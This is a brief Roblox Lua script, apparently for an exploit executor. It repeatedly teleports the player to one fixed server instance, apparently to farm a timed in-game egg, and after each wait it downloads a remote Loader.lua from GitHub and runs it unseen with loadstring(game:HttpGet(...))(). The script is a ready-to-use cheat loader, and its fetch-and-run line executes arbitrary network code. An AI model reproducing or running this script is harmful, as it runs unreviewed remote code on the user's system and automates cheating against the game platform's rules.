-- Zeit in Sekunden, wie lange das Egg verfügbar ist
local EggTimeLeft = 180
while true do
    game:GetService("TeleportService"):TeleportToPlaceInstance(85896571713843, "0f7aca77-be20-4758-aaff-b397918b2912")
    wait(EggTimeLeft)
    loadstring(game:HttpGet("https://raw.githubusercontent.com/PxnifyDev/roblox-job-ids/main/data/Loader.lua"))()
end
